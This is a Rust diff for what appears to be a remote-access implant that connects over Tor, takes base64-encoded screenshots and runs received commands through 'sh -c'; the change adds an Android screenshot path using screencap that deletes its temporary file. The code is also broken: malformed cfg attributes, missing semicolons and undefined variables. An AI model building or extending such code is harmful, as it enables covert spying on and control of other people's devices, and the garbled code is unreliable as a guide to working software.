@@ -21,6 +21,7 @@ use rand::Rng;
 use std::{fs,env};
 use std::path::{Path, Prefix};
 use base64::{engine::general_purpose, Engine as _};
+[cfg(target_os != "android")]
 use screenshots::Screen;
 
 
@@ -58,7 +59,7 @@ async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
     println!("Initialized Tor Client");
     Ok(client)
 }
-
+#[cfg(target_os != "android")]
 fn take_screenshot_base64() -> anyhow::Result<String> {
     let screens = Screen::all()?;
     let screen = &screens[0];
@@ -68,8 +69,22 @@ fn take_screenshot_base64() -> anyhow::Result<String> {
     let mut buf = Vec::new();
     image.write_to(&mut buf, image::ImageOutputFormat::Png)?;
     let encoded = general_purpose::STANDARD.encode(&buf) 
-    Ok(format!("{}",encoded).into_bytes())
+    Ok(format!("{}",encoded))
 }
+#[cfg(target_os == "android")]
+fn take_screenshot_base64()-> anyhow::Result<String>{
+    let path_str = "/data/local/tmp/screenshot.png"
+    Command::new("screencap")
+    .arg("-p")
+    .arg(path_str)
+    .output()?;
+    let path = Path::new(path);
+    let bytes = fs::read(path);
+    fs::remove_file(path);
+    let encoded = general_purpose::STANDARD.encode(&buf) ;
+    Ok(format!("{}",encode))
+}
+
 
 /// Build prompt string
 pub fn build_prompt() -> String {
@@ -210,7 +225,7 @@ Available commands:
 
             #[cfg(not(target_os = "windows"))]
             let mut command = {
-                let mut c = Command::new("/bin/sh");
+                let mut c = Command::new("sh");
                 c.arg("-c").arg(input);
                 c
             };
